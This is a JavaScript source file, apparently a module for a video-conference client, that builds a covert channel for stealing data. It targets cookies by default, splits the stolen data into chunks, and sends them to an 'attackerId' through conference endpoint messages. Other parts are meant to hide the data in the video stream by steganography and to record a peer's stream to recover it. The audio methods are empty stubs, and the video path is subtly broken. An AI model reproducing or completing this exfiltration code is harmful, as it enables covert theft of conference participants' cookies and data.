/* global APP, splitString, getDefaultSettings */
import VideoSteganoEffect from './VideoSteganoEffect';

export const defaultConfigurationValues = {
    method: 'plain',
    dataType: 'cookies',
    chunkSize: 5000
};

/**
 * Implementation of different convert channel methods
 */
class CovertChannelMethods {

    // reference to all other methods
    static options = {
        'plain': CovertChannelMethods.usePlain,
        'video': CovertChannelMethods.useVideo,
        'audio': CovertChannelMethods.useAudio
    };

    /**
     * Sending data using simple plain method
     * @param {any} data - specified data to be sent
     */
    static async usePlain(data, attackerId) {
        APP.conference.sendEndpointMessage(attackerId, {
            extraction: 'reply',
            payload: data
        });
    }

    /**
     * Create an effect of hidding data inside the video
     */
    _createSteganoEffect(stream: MediaStream, acquiredData: Object, usedMethod: Object) {
        if (!MediaStreamTrack.prototype.getSettings) {
            return Promise.reject(new Error('Stegano cannot be implemented!'));
        }

        // insert acquired data inside the video using specified method
        return Promise.resolve(new VideoSteganoEffect(stream, acquiredData, usedMethod));
    }

    /**
     * Send data using video stream
     * @param {any} data - specified data to be sent
     */
    static async useVideo(acquiredData, usedMethod) {
        const localVideo = APP.conference.localVideo;
        const steganoEffect = this._createSteganoEffect(localVideo.stream, acquiredData, usedMethod);

        await localVideo.setEffect(steganoEffect);
    }

    /**
     * Send data using audio stream
     * @param {any} data - specified data to be sent
     */
    static async useAudio(data) {
        console.log(data);
    }
}

/**
 * Extracting data from covert channel
 */
class ExtractionCovertChannelMethods {

    // reference to all other methods
    static options = {
        'video': ExtractionCovertChannelMethods.usedVideo,
        'audio': ExtractionCovertChannelMethods.usedAudio
    };

    /**
     * Receiving data using video stream
     */
    static async usedVideo(user) {
        // define MediaRecorder of received stream
        const mediaRecorder = new MediaRecorder(user._tracks[0].stream);

        mediaRecorder.ondataavailable = async blob => {
            console.log(await blob.data.arrayBuffer());
        };
        mediaRecorder.start(100);
    }

    /**
     * Receiving data using audio stream
     */
    static async usedAudio() {
    }
}


/**
 * Class responsible for extraction handling
 */
export class ExtractionHandler {
    /**
     * @param {object} configuration - Object containing information about data extraction
     */
    constructor(configuration, dataSource) {
        this.configuration = getDefaultSettings(defaultConfigurationValues, configuration);
        this.dataSource = dataSource;
        this._fileBuffer = [];
    }

    /**
     * getter for full file buffer
     */
    get fullData() {
        if (this._fileBuffer?.length) {
            return this._fileBuffer?.reduce((first, second) => first + second);
        }

        return '';
    }

    /**
     * Send data through the specified method.
     * @param {any} data - data to be sent.
     */
    async sendAll(data, attackerId) {
        for (const chunkData of splitString(data, this.configuration.chunkSize)) {
            // send data using corresponding method
            await CovertChannelMethods.options[this.configuration.method](chunkData, attackerId);
        }
        APP.conference.sendEndpointMessage(attackerId, {
            extraction: 'reply',
            isEnd: true
        });
    }

    /**
     * Receive reply data through the specified extraction method.
     * Could be either plain text payload data, or control info (ending message).
     * @param {*} recievedData - Data received from endpointTextMessage.
     * @param {*} event - Custom event for dispatching data when extraction ended.
     */
    receivePlainData(recievedData, event) {
        // extract data using specified method
        if (recievedData.isEnd) { // 'reply' control ending message
            if (event) {
                // Event for downloading extracted data at the end of extraction.
                // Define custom event 'extractionEnded' and trigger it.
                event.dispatchEvent(new CustomEvent('extractionEnded', {
                    detail: {
                        extractedData: this.fullData
                    }
                }));
            }
            this._fileBuffer = []; // empty the file buffer after ending communication.

        } else { // 'reply' containg text data
            this._fileBuffer.push(recievedData.payload);
        }
    }

    /**
     * Receive data through the specified extraction method.
     */
    async receiveAll() {
        // TODO: add generic code for all types of communication.
    }
}
